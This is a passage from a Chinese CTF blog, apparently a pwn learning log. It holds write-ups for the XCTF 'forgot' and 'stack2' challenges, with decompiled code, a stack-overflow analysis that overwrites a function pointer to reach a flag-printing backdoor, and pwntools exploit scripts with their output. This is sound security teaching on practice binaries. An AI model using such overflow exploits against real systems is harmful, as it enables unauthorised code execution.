class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9</span><span class="token punctuation">:</span>        v14 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fun1 <span class="token operator">+</span> <span class="token operator">--</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #跳转到指针数组指向特定函数  main函数之外：  后门，这个函数名和前面的混在一起我一开始都没找到  <span class="token keyword">int</span> <span class="token function">sub_80486CC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-3Ah]</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token string">"cat %s"</span><span class="token punctuation">,</span> <span class="token string">"./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>snprintf函数收录</p><h2 id="3：分析"><a href="#3：分析" class="headerlink" title="3：分析"></a>3：分析</h2><p>首先由于存在栈溢出，且数组v2下面的都是函数指针那我们就可以控制fun1<del>fun3，以及v6</del>v12的函数指针，还有v14。<br>有后门，那么我们只要想到如何控制程序流程跳转到后门即可。<br>在for循环语句中，会根据数组v2中的字符来改变v14的大小，跳出循环后到这个语句：(*(&amp;fun1 + –v14))() 显然是执行指针所指向的函数。整个过程&amp;fun1不变，变的只有v14那么我们可以设计payload使得v14的变化在我们可以预测。那么就要好好分析switch case中的语句。<br>我们进入第一个判断函数sub_8048702：</p><pre><code>_BOOL4 __cdecl sub_8048702(char a1){  return a1 &gt; &#39;`&#39; &amp;&amp; a1 &lt;= &#39;z&#39; || a1 &gt; &#39;/&#39; &amp;&amp; a1 &lt;= &#39;9&#39; || a1 == &#39;_&#39; || a1 == &#39;-&#39; || a1 == &#39;+&#39; || a1 == &#39;.&#39;;// A~Z ：65~90   \xcc\x86\x04\x08}</code></pre><p>说实话第一眼看到这个鬼东西我是真的不想去分析它的逻辑，但是没办法，做生意又不会做。<br>&amp;&amp;  的优先级比 ||高  俩个都是从左到右。第一个&amp;&amp;最先计算，第一个||是最后运算，第二个&amp;&amp;第二运算  其他|| 从左到右。<br>因为第二个||是最后运算的，所以第一个&amp;&amp;运算结果是1那整体就是1. 为了不使v14有过多改变我们想办法构造的输入使这个整体为0.<br>发现没有对大写字母的判断所以padding可以用A。<br>仔细观察下面的判断，结合第一个判断我们知道只要payload里面没有@，v14就不可能大于3.<strong>所以程序流程只能最后执行&amp;fun1上面的函数，或是&amp;fun1+1上面的函数，这里需要对&amp;fun1+1和fun+1说明一下</strong></p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果</p><pre class=" language-bash"><code class="language-bash">000000000040153000000000004015318000000000062FDD0000000000062FDD8000000000062FDD8</code></pre><p>fp是一个指针放入了main函数的地址。我们直接输出fp时输出了它的值，也就是main函数地址，对其+1再输出可以看到其输出也仅仅是+1（数值+1）<br>不过我输出fp的地址&amp;fp，再输出其地址+1的结果，可以看到变动了0x8，也恰好等于下一个指针的地址。并不是简单+1。<strong>所以对于地址（&amp;取地址，操作目标是地址）那就是正真的地址+1到下一个地址。</strong><br><strong>回到&amp;fun+1 那么这将指向下一个函数，即fun2 = sub_8048618。</strong></p><p>所以我们要么覆盖fun1，要么覆盖fun2.用后门地址<br>payload = ‘A’*0x24 + p32(0x080486CC)<br>这里我打算覆盖到fun2，因为p32(0x080486CC)（这个东西经过判断函数后是会让v14变成2的,反正我当时是这么想的)</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> p32<span class="token punctuation">(</span>0x080486CC<span class="token punctuation">)</span> <span class="token string">'\xcc\x86\x04\x08'</span><span class="token operator">>></span><span class="token operator">></span></code></pre><p>自己写一个一模一样的判断函数然后输入这一串字符你就会发现会使if成立。然后v14==2 并且一直等于2 </p><p>那么(*(&amp;fun1 + –v14))() 就会指向fun2.</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong><em>但是很可惜，我的分析又是错的（日了狗了，很操蛋）</em></strong></p><h2 id="5：探究"><a href="#5：探究" class="headerlink" title="5：探究"></a>5：探究</h2><p>我觉的思路绝对没问题，折腾了好久发现问题出在pwntools上。<br>看看我的一个程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'\x00'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'9'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"work!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>没错我会输入<span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x080486CC</span><span class="token punctuation">)</span>具体内容，然后看看到底会判断结果是什么</code></pre><pre class=" language-bash"><code class="language-bash">In <span class="token punctuation">[</span>4<span class="token punctuation">]</span>: payloadOut<span class="token punctuation">[</span>4<span class="token punctuation">]</span>: <span class="token string">'\xcc\x86\x04\x08'</span></code></pre><p>首先我直接输入\xcc\x86\x04\x08：<br><img src="https://s1.ax1x.com/2020/07/16/UrhfSI.png" alt=""><br>发现确实如我上面所说，会判断为正确（work）</p><p>但是我用脚本执行并输入：<br><img src="https://s1.ax1x.com/2020/07/16/Urh46P.png" alt=""><br>并没有通过判断！！！！<br><strong>看来 用pyhton-pwntools 输入与人工输入是有区别的</strong>。再来看一个：<br><img src="https://s1.ax1x.com/2020/07/16/Urhhlt.png" alt=""><br>这是我第一次想到的脚本，你会发现36个A后面的东西很奇怪，尤其是第一个\还带~的，这些问题有待考究。</p><p>因为p32(0x080486cc)用pwntools输入并不会通过判断所以最终的EXP是：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x29 bytes:    00000000  63 61 74 3a  20 2e 2f 66  6c 61 67 3a  20 e6 b2 a1  │cat:│ ./f│lag:│ ···│    00000010  e6 9c 89 e9  82 a3 e4 b8  aa e6 96 87  e4 bb b6 e6  │····│····│····│····│    00000020  88 96 e7 9b  ae e5 bd 95  0a                        │····│····│·│    00000029cat: ./flag: 没有那个文件或目录<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./forgot'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 47704<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  一句话：虽然很操蛋，但是通过自己死磕搞懂了还是挺爽的。</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-challege </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-stack2</title>
      <link href="/2020/07/15/xctf-challenge-stack2/"/>
      <url>/2020/07/15/xctf-challenge-stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/stack2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>开启NX与Canary</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-7Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>关键段：</strong></p><pre class=" language-c"><code class="language-c">      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></code></pre><h2 id="3：漏洞"><a href="#3：漏洞" class="headerlink" title="3：漏洞"></a>3：漏洞</h2><p><strong>整个代码比较长，但有用的就那么一两个。</strong>关键段代码实现更改数字的功能，v13数组大小是100，<strong>但在这里并没有看到限制了目标位置的输入大小，即：which number to change: 。</strong>而通过伪代码发现v13位于[ebp-70h]所以如果我第一次输入的数字比较大，就可以通过第二次输入来更改高地址栈空间。<br>那么接下来主要就是计算v13到返回地址的长度。</p><p>一开始我认为是这样的：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZMKP.png" alt=""><br>那么只要0x70+4 =116个padding就可以了但是怎么都没有成功跳转，我调试发现原来，这个程序的栈没有这么理想：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zlb8.png" alt=""><br>刚开始是这个样子，返回地址__libc_start_main+241已经在栈中了，可以理解为main函数也是被调用的（call）先压入返回地址再跳转执行函数</p><p>执行完main+7：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZQDf.png" alt=""><br>发现上面那个push指令又将这个返回地址压入栈中，那么哪一个才是真的返回地址？那肯定遵循调用函数（call）的说法：<strong>先将返回地址压入栈中，再跳转执行函数，所以一开始压入的才是函数真正的返回地址。</strong><br>我们可以看到马上要执行push  ebp，所以返回地址离ebp有16个字节的距离。这个从栈中可以看出，也可以从一个作恶多端的汇编指令中得出：发现了<strong>0x80485d4 &lt;main+4&gt;:    and    esp,0xfffffff0</strong>  这句话吗？<br>没错是用来平衡堆栈的，与运算。将esp最后一个16进制数归零。我们去看一下当时esp是多少：<br><img 